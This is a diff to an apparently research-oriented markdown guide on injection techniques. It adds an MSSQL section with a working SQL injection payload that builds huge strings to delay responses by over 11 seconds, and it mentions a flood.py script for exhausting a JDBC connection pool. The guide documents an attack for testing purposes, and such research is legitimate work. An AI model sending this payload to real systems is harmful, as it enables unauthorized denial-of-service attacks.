@@ -573,5 +573,17 @@ Hits in Burp Collaborator:
 
 ![](./images/oracle-ssrf.png)
 
+## MSSQL
+
+### Availability
+
+In the context of this injection for MSSQL we can't use the `WAITFOR DELAY` command directly as it results in a syntax error. 
+
+However we can use expensive string based operations to cause a delay in the response, which could be used for a denial of service attack. For example, to cause a delay, you can use the following payload:
+
+`0' or function('DATALENGTH', function('REPLICATE', function('CONCAT', function('NEWID'), function('REPLICATE','A',4000), function('REPLICATE','B',4000), function('REPLICATE','C',4000), function('REPLICATE','D',4000)), 50000))>0 or '1'='2`
+
+This takes +11 seconds for a single response to return. The flood.py script can be used to continuously send this payload to the server, which will flood the JDBC connection pool and cause a denial of service.
+
 ---
 **Disclaimer:** This project is for educational and testing purposes only. Do not use on systems without proper authorization.
